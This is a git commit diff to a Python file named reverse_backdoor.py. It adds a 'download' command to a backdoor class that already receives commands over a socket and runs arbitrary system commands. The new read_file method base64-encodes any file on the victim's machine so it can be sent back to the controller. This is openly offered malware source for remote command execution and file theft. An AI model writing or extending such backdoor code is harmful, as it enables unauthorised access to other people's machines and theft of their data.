1d9800f148fed3d98e266a87f967e0dc0bdb7097
Shahrukh <tramboos123@gmail.com>
2021-01-30 14:56:36 +0530

    download hacked function

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -1,5 +1,5 @@
 import socket
-import subprocess, json, os
+import subprocess, json, os, base64
 
 
 class Backdoor:
@@ -28,6 +28,10 @@ class Backdoor:
     	os.chdir(path)
     	return "[+] Changing working directory to " + path
 
+    def read_file(self, path):
+		with open(path, "rb") as file:
+			return base64.b64encode(file.read())    	
+
     def run(self):
         while True:
             command = self.reliable_recv()
@@ -36,6 +40,8 @@ class Backdoor:
                 exit()
             elif command[0] == "cd" and len(command) > 1:
             	command_result = self.change_working_directory_to(command[1])
+            elif command[0] == "download":
+            	command_result = self.read_file(command[1])
             else:
             	command_result = self.execute_system_command(command)
             self.reliable_send(command_result)
